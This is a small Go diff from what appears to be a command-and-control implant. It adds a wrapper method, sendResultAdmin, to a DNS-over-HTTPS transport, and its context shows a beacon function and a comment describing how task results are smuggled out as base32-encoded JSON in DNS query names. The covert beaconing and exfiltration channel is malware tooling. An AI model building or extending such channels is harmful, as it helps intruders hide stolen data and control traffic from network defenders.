@@ -267,6 +267,10 @@ func (d *dohTransport) beacon() ([]taskWire, error) {
 //
 // DoH path: GET /dns-query?name=r.<base32(JSON{a:agentID, d:b64ct})>&type=TXT
 // Response TXT: "ack"
+func (d *dohTransport) sendResultAdmin(taskID int64, output, errStr string, _ bool) error {
+	return d.sendResult(taskID, output, errStr)
+}
+
 func (d *dohTransport) sendResult(taskID int64, output, errStr string) error {
 	plaintext, err := json.Marshal(resultRequest{TaskID: taskID, Output: output, Error: errStr})
 	if err != nil {
